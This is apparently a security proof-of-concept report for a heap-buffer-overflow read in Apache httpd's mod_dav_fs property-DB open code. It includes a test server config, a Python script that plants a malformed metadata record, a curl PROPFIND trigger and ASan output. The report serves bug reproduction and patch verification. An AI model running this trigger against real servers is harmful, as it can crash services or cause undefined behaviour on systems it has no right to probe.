# PoC 112 — Short Metadata Value Overread

`dav_propdb_open()` `memcpy`s `sizeof(dav_propdb_metadata)` bytes from the
DBM `METADATA` value without checking `value.dsize >= sizeof(m)`, so a short
metadata record causes a heap-buffer-overflow read at property-DB open time.

## Setup

`mod_dav` + `mod_dav_fs` with a writable filesystem. Run httpd under ASan.

`httpd.conf`:

```apache
ServerName 127.0.0.1
Listen 8080
LoadModule mpm_prefork_module    modules/mod_mpm_prefork.so
LoadModule dav_module            modules/mod_dav.so
LoadModule dav_fs_module         modules/mod_dav_fs.so
LoadModule authz_core_module     modules/mod_authz_core.so
LoadModule unixd_module          modules/mod_unixd.so

DAVLockDB /tmp/davlock
DocumentRoot "/tmp/htdocs"
<Directory "/tmp/htdocs">
    DAV On
    Require all granted
</Directory>
```

```bash
mkdir -p /tmp/htdocs/.DAV
touch /tmp/htdocs/file.txt
```

## Trigger

Plant a malformed property DB whose `METADATA` value is shorter than
`sizeof(dav_propdb_metadata)` (12 bytes on most builds). We use the
SDBM-format files httpd's APR DBM defaults to:

```python
# /tmp/plant_short_meta.py
import dbm.ndbm, os, struct
# Path mirrors what mod_dav_fs uses for /tmp/htdocs/file.txt:
db = dbm.ndbm.open("/tmp/htdocs/.DAV/file.txt", "c")
db[b"METADATA"] = b"\x01"   # 1 byte, far below sizeof(dav_propdb_metadata)
db.close()
```

```bash
python3 /tmp/plant_short_meta.py
```

Then issue a `PROPFIND` against the resource — this opens the property DB:

```bash
curl -sv -X PROPFIND -H 'Depth: 0' \
     --data-binary '<?xml version="1.0"?><D:propfind xmlns:D="DAV:"><D:allprop/></D:propfind>' \
     -H 'Content-Type: application/xml' \
     http://127.0.0.1:8080/file.txt
```

## Observed effect

ASan trips during the `memcpy(&m, value.dptr, sizeof(m))` at
`modules/dav/fs/dbm.c:481`:

```text
==1234==ERROR: AddressSanitizer: heap-buffer-overflow on address ...
READ of size 12 at 0x...
    #0 ... in __asan_memcpy
    #1 dav_propdb_open    modules/dav/fs/dbm.c:481
    #2 dav_really_open_db modules/dav/main/props.c:512
    #3 ...                modules/dav/main/mod_dav.c (PROPFIND handler)
```

Without ASan, the read silently succeeds with garbage bytes adjacent to the
DBM allocation, leading to a follow-on `DAV_ERR_PROP_BAD_MAJOR` or, if the
random `m.major` happens to match, undefined behavior in subsequent metadata
parsing. With the patch the open is rejected as corrupt and `PROPFIND`
returns 500 cleanly.

## Marker

ASan `heap-buffer-overflow ... READ of size 12 at ... dav_propdb_open
(modules/dav/fs/dbm.c:481)`.
